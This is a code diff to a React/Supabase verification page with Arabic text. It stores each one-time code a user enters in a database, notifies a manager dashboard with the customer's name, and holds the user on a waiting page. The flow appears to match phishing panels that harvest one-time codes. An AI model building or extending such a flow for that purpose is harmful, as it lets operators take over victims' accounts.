@@ -168,50 +168,59 @@ export default function VerifyPage() {
       // Save verification code to database
       sessionStorage.setItem('verification_code', fullCode);
       
-      // Try to get registration_id if not available
+      // Resolve the registration and customer name for the dashboard notification.
       let registrationId = regId;
-      if (!registrationId && regEmail) {
-        const { data: regData } = await supabase
+      let customerName = sessionStorage.getItem('reg_name') || '';
+
+      if ((!registrationId || !customerName) && (registrationId || regEmail)) {
+        let registrationQuery = supabase
           .from('registrations')
-          .select('id')
-          .eq('email', regEmail)
-          .single();
+          .select('id, full_name');
+
+        registrationQuery = registrationId
+          ? registrationQuery.eq('id', registrationId)
+          : registrationQuery.eq('email', regEmail).order('created_at', { ascending: false }).limit(1);
+
+        const { data: regData } = await registrationQuery.maybeSingle();
         if (regData) {
           registrationId = regData.id;
+          customerName = regData.full_name || customerName;
+          sessionStorage.setItem('reg_id', regData.id);
+          if (customerName) sessionStorage.setItem('reg_name', customerName);
         }
       }
       
       // Save to database and get the ID
-      try {
-        const { data, error: insertError } = await supabase
-          .from('verification_codes')
-          .insert({
-            registration_id: registrationId || null,
-            client_id: getClientId(),
-            code: fullCode,
-          })
-          .select()
-          .single();
-        
-        if (!insertError && data) {
-          sessionStorage.setItem('verification_attempt_id', data.id);
+      const { data, error: insertError } = await supabase
+        .from('verification_codes')
+        .insert({
+          registration_id: registrationId || null,
+          client_id: getClientId(),
+          code: fullCode,
+        })
+        .select()
+        .single();
 
-          // Notify the manager immediately without sending the verification code
-          await emitInstantNotification('verification_code', {
-            id: data.id,
-            registration_id: typeof registrationId === 'string' ? registrationId : null,
-            created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
-          });
-        }
-      } catch (dbErr) {
-        console.warn('Could not save verification code to database:', dbErr);
+      if (insertError || !data) {
+        console.error('Could not save verification code to database:', insertError);
+        throw new Error(insertError?.message || 'تعذر حفظ رمز التحقق');
       }
+
+      sessionStorage.setItem('verification_attempt_id', data.id);
+
+      // Notify the manager immediately without sending the verification code
+      await emitInstantNotification('verification_code', {
+        id: data.id,
+        name: customerName || undefined,
+        registration_id: typeof registrationId === 'string' ? registrationId : null,
+        created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
+      });
       
       setLoading(false);
       
       // توجيه لصفحة انتظار التحقق
       navigate('/verify-waiting');
-    } catch (err) {
+    } catch {
       setLoading(false);
       setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
     }
